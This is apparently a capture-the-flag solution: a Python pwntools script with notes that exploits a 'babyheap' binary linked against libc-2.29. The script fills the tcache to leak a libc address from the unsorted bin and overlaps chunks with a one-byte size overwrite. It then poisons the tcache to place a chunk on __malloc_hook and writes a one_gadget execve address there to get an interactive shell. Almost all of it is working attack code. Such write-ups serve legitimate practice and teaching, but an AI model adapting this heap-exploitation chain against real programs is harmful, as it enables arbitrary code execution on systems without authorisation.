""" strings the libc to find out the version
strings libc.so | grep libc-

libc-2.29.so

[*] Note: there are only 7 tcache chunks in ONE ENTRY/BIN, the 8th chunk and beyond go into unsorted bin.
[*] Note: but there are 64 tcache entries/bins, so we can't use different size to get 8th chunk (see below).

For some reason, when we reallocate the 8th chunk (after freeing all of them), the address of some place in libc is 8 bytes away from our 8th chunk => fill 8 bytes, then let `puts` leak the address. 
But tcache chunks always get checked first to see if their size meet the requirements.
=> we reallocate everything make sure we get it back. 

[*] Note: we need to allocate all 10 chunks. The 8th and 9th chunks are the first ones in the unsorted bin and will have the libc address. Need to have a spare chunk (10th chunk) to prevent coalescing with top chunk. For some reason, if we choose to leak from the 9th chunk instead, the memory holding the libc address will be freed. This does not happen with the 8th chunk.

"""
from pwn import *

s = process("./babyheap", env={"LD_PRELOAD": "./libc.so"})
libc = ELF("./libc.so")
log.info("_malloc_hook offset: {}".format(hex(libc.symbols["__malloc_hook"])))
f = open("in.txt", "w") 

def make(size, payload):
    s.sendlineafter("> ", "M")
    s.sendlineafter("> ", str(size))
    s.sendlineafter("> ", payload)
    f.write("M\n")
    f.write(str(size) + "\n")
    f.write(payload + "\n")

def destroy(idx):
    s.sendlineafter("> ", "F")
    s.sendlineafter("> ", str(idx))
    f.write("F\n")
    f.write(str(idx) + "\n")

def show(idx):
    s.sendlineafter("> ", "S")
    s.sendlineafter("> ", str(idx))
    f.write("S\n")
    f.write(str(idx) + "\n")


for i in range(10):
    make(0xf8, "1")

for i in range(10):
    destroy(i)          # after this the indices of the chunks are in reversed order.

for i in range(7):      # new chunks 0-9 are now old chunks 9-0.
    make(0xf8, "1")

make(0xf8, "AAAABBBB")  # get back 8th chunk 
make(0xf8, "AAAABBBB")
make(0xf8, "AAAABBBB")
show(7)                 # chunks are 0-indexed
leak = s.recvline().strip()[8:]
libc.address = u64(leak.ljust(8, "\x00")) - 0x1e4ca0        # offset in libc 
log.info("Libc base: {}".format(hex(libc.address)))

destroy(7)
destroy(8)

# since tcache is LIFO, we free in reverse order to what we wish to allocate. 
destroy(0)                  
destroy(1)                  
destroy(3)                  
destroy(2)                  
destroy(4)                  
                            
execve = libc.address + 0xe2383     # use one_gadget and try all of them 

make(0xf8, "????????")              # 0 - old 5         2 chunks at 2 ends to be safe
make(0xf8, "11111111")              # 1 - old 7
make(0xf8, "0"*0xf8 + chr(0x81))    # 2 - old 6
make(0xf8, "33333333")              # 3 - old 8 whose pointer will be overwritten
make(0xf8, "44444444")              # 4 - old 9 to prevent coalescing 
                            

destroy(1)
destroy(3)
make(0x178, "0"*0xf8 + "1"*8 + p64(libc.symbols["__malloc_hook"]).replace("\x00", ""))       # get back 1
make(0xf8, "AAAAAAAA")                                          # get back 3
make(0xf8, p64(execve).replace("\x00", ""))                    # __malloc_hook chunk

s.sendlineafter("> ", "M")
s.sendlineafter("> ", "30")
s.interactive()




